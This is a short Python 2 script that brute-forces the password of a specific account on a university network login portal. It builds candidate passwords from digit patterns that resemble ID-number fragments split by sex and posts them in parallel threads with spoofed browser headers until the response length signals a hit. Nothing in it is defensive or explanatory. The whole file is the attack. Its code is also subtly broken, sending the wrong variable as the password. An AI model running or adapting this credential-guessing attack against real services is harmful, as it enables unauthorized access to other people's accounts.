__author__ = 'lms'

import requests
import time
import multiprocessing.dummy as multiThreading
import multiprocessing

request_url = "http://w.nuaa.edu.cn/iPortal/action/doLogin.do"
login_info = {
                'username': '70204838',
                'password': '',
                'saved': '1',
                "from": '003cc944be32e25365428f2dd2adbbe2',
                'domain': 'nuaa'
                 }

headers = {
            'Accept': 'application/json, text/javascript, */*; q=0.01',
            'Accept-Language': 'zh-CN,zh;q=0.8,en;q=0.6',
            'Connection': 'keep-alive',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Host': 'w.nuaa.edu.cn',
            'Origin': 'http://w.nuaa.edu.cn',
            'Referer': 'http://w.nuaa.edu.cn/iPortal/index.htm?'
                      'from=003cc944be32e25365428f2dd2adbbe2&wlanuserfirsturl=http://www.baidu.com/',
            'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_0) AppleWebKit/537.36 (KHTML, like Gecko) '
                        'Chrome/38.0.2125.104 Safari/537.36',
            'X-Requested-With': 'XMLHttpRequest'

            }
password_array = ['', '', '', '']
password_divi = [0, 25, 50, 75]
password_prefix = ['01', '02', '03', '04', '05', '06', '07', '08', '09']
password_middle = ['00', '01', '02', '03', '04', '05', '06', '07', '08', '09']
password_index = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9']
password_male = ['1', '3', '5', '7', '9']
password_female = ['0', '2', '4', '6', '8']

for prefix in range(10, 32):
    password_prefix.append(str(prefix))
for middle in range(10, 100):
    password_middle.append(str(middle))

def verify(index, sem):
    for j in range(25):
        for m in range(5):
            for n in range(10):
                if sem.is_set():
                    return

                password_array[index] = '27'+password_middle[password_divi[index]+j]+password_male[m]+password_index[n]
                login_info['password'] = password_index

                loginRequest = requests.post(request_url, data=login_info, headers=headers)
                print password_array[index]
                if loginRequest.headers['content-length'] >= '258':
                    password = password_array[index]
                    print "The password is " + password
                    sem.set()
                    end_time = time.time()
                    print "The time spent is " + str(end_time-start_time)
                    return


if __name__ == "__main__":
    sem = multiThreading.Event()
    start_time = time.time()
    for index in range(4):
        multiThreading.Process(target=verify, args=(index, sem)).start()

